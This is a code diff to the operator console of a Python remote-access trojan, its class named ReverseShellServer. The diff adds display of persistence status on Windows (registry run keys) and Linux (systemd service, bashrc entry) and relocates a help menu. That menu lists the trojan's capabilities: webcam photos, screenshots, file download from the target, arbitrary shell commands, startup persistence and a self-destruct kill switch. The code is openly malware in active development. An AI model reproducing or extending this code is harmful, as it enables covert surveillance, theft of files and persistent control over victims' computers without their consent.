@@ -191,7 +191,7 @@ class ReverseShellServer:
                 return {"error": f"Path is not a file: {file_path}"}
             
             file_size = os.path.getsize(file_path)
-            if file_size > 50 * 1024 * 1024:  # 50MB limit
+            if file_size > 50 * 1024 * 1024:
                 return {"error": f"File too large (max 50MB): {file_size} bytes"}
             
             with open(file_path, 'rb') as f:
@@ -262,14 +262,60 @@ class ReverseShellServer:
         for cam in cameras:
             print(f"{cam['index']:<8} {cam['resolution']:<20} {cam['fps']:<10} {cam['status']:<15}")
 
-    def display_startup_status(self, startup_status):
+    def display_startup_status(self, data):
         print("\n" + "="*50)
         print("STARTUP STATUS")
         print("="*50)
         
-        for key, value in startup_status.items():
-            status = "ENABLED" if value else "DISABLED"
-            print(f"  {key}: {status}")
+        status = data.get("startup_status", {})
+        platform = data.get("platform", "Unknown")
+        
+        print(f"  Platform: {platform}")
+        print()
+        
+        if platform == "Windows":
+            hkcu = status.get("HKEY_CURRENT_USER", False)
+            hklm = status.get("HKEY_LOCAL_MACHINE", False)
+            print(f"  HKEY_CURRENT_USER: {'ENABLED' if hkcu else 'DISABLED'}")
+            print(f"  HKEY_LOCAL_MACHINE: {'ENABLED' if hklm else 'DISABLED'}")
+        elif platform == "Linux":
+            systemd = status.get("systemd_service", False)
+            bashrc = status.get("bashrc_entry", False)
+            
+            if systemd == True:
+                print(f"  Systemd Service: ACTIVE")
+            elif systemd == "exists_inactive":
+                print(f"  Systemd Service: INSTALLED (inactive)")
+            else:
+                print(f"  Systemd Service: DISABLED")
+            
+            print(f"  Bashrc Entry: {'ENABLED' if bashrc else 'DISABLED'}")
+        else:
+            for key, value in status.items():
+                if isinstance(value, bool):
+                    print(f"  {key}: {'ENABLED' if value else 'DISABLED'}")
+                else:
+                    print(f"  {key}: {value}")
+
+    def show_help(self):
+        print("\n" + "="*50)
+        print("AVAILABLE COMMANDS")
+        print("="*50)
+        print("info              - System information")
+        print("screenshot        - Take screenshot")
+        print("list_cam          - List available cameras")
+        print("cam [index]       - Take photo from camera (default: 0)")
+        print("processes         - List running processes")
+        print("network           - Network information")
+        print("download <path>   - Download file from target")
+        print("upload <local_file> [remote_path] - Upload file to target")
+        print("startup           - Add to startup")
+        print("startup_remove    - Remove from startup")
+        print("startup_status    - Check startup status")
+        print("kill_switch       - Self-destruct trojan")
+        print("<command>         - Execute shell command")
+        print("exit/quit         - Exit shell")
+        print("help              - Show this help")
 
     def handle_upload_command(self, client_sock, command):
         try:
@@ -301,26 +347,6 @@ class ReverseShellServer:
             print(f"[-] Upload command error: {e}")
             return False
 
-    def show_help(self):
-        print("\n" + "="*50)
-        print("AVAILABLE COMMANDS")
-        print("="*50)
-        print("info              - System information")
-        print("screenshot        - Take screenshot")
-        print("list_cam          - List available cameras")
-        print("cam [index]       - Take photo from camera (default: 0)")
-        print("processes         - List running processes")
-        print("network           - Network information")
-        print("download <path>   - Download file from target")
-        print("upload <local_file> [remote_path] - Upload file to target")
-        print("startup           - Add to startup")
-        print("startup_remove    - Remove from startup")
-        print("startup_status    - Check startup status")
-        print("kill_switch       - Self-destruct trojan")
-        print("<command>         - Execute shell command")
-        print("exit/quit         - Exit shell")
-        print("help              - Show this help")
-
     def handle_client_command(self, client_sock, client_addr, command):
         if command.lower() in ['exit', 'quit']:
             self.send_encrypted(client_sock, "exit")
@@ -340,7 +366,6 @@ class ReverseShellServer:
             self.send_encrypted(client_sock, {"type": "list_cam"})
             
         elif command.lower().startswith('cam'):
-            # Проверяем, указан ли индекс камеры
             parts = command.split()
             if len(parts) > 1:
                 try:
@@ -448,9 +473,13 @@ class ReverseShellServer:
                 if "success" in result:
                     print(f"[+] {result['message']}")
                     if "user_startup" in result:
-                        print(f"    User startup: {'✓' if result['user_startup'] else '✗'}")
+                        print(f"    User startup: {'YES' if result['user_startup'] else 'NO'}")
                     if "system_startup" in result:
-                        print(f"    System startup: {'✓' if result['system_startup'] else '✗'}")
+                        print(f"    System startup: {'YES' if result['system_startup'] else 'NO'}")
+                    if "systemd_enabled" in result:
+                        print(f"    Systemd service: {'ACTIVE' if result['systemd_enabled'] else 'FAILED'}")
+                    if "bashrc_enabled" in result:
+                        print(f"    Bashrc entry: {'YES' if result['bashrc_enabled'] else 'NO'}")
                 elif "error" in result:
                     print(f"[-] Startup error: {result['error']}")
                 else:
